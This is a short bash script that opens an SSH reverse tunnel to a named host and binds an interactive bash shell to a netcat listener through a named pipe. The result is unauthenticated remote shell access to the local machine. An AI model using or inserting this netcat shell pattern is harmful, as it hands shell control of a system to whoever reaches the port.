#!/bin/bash
src_dir="${1:?Usage $0 [hostname]}"
if [ -e /tmp/mypipe ]; then
  rm /tmp/mypipe
fi
mkfifo /tmp/mypipe
ssh -R 6000:localhost:6000 -N $1 &
cat /tmp/mypipe|/bin/bash -i 2>&1 | nc -l 6000 >/tmp/mypipe
rm /tmp/mypipe

